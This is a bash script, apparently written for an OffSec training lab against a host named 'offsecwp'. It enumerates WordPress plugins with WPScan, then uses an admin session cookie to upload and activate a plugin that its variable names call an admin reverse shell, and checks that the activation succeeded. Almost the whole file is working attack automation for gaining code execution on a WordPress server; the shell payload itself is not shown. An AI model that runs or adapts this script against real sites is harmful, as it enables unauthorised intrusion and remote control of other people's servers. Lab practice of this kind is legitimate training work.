#!/bin/bash
run_wpscan() {
    local url="$1"
    local name="$2"
    if [[ -z "$wpscan_log" ]]; then
        wpscan_log="wpscan.log"
    fi
    if [[ -f "$wpscan_log" ]]; then
        echo "WPScan output already exists, skipping scan."
        return
    fi
    echo "Running WPScan..."
    wpscan --url http://$url --enumerate ap | tee -a $wpscan_log    
}

upload_plugin() {
    cookie_jar="$1"
    plugin_file="$2"
    target_hostname="$3"
    plugin_name=$(cat "$plugin_file" | grep -oP '\K[^\.]+')
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname is not set. Using ip"
        target_hostname=$ip
    fi
    plugin_page=$(curl -s --cookie $cookie_jar "http://offsecwp/wp-admin/plugins.php" | grep "$admin_reverse_shell_plugin" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found, uploading..."
        nonce=$(curl -s --cookie $cookie_jar "http://offsecwp/wp-admin/plugin-install.php?tab=upload"| grep -oP 'name="_wpnonce" value="\K[^"]+')
        echo "Nonce: $nonce"    
        curl -v --cookie $cookie_jar -F "_wpnonce=$nonce" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@$admin_reverse_shell_plugin.zip" "http://offsecwp/wp-admin/update.php?action=upload-plugin"
    fi

    plugin_page=$(curl -s --cookie $cookie_jar "http://offsecwp/wp-admin/plugins.php" | grep "$admin_reverse_shell_plugin" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found after upload."
        exit 1
    fi
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    if [[ ! -z "$deactivate" ]]; then
        echo "Plugin has already been activated."
    else
        echo "Plugin is not activated, activating now..."
        echo $plugin_page > plugin_page.txt
        activate_url=$(echo "$plugin_page" | grep -oP "<span class='activate'><a href=\"\K[^\"]+" | sed 's/\&amp;/\&/g')
        echo "Activate URL: $activate_url"
        curl -s -v --cookie $cookie_jar "http://offsecwp/wp-admin/$activate_url"
        #echo $activate_page > activate_page.txt

    fi

    plugin_page=$(curl -s --cookie attacker-cookie.txt "http://offsecwp/wp-admin/plugins.php" | grep "$admin_reverse_shell_plugin" )
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    echo "$deactivate"
    if [[ -z "$deactivate" ]]; then
        echo "Plugin is not activated, activation failed."
        echo "$plugin_page" > plugin_page.txt
        echo "$deactivate" > deactivate.txt
        exit 1
    fi

}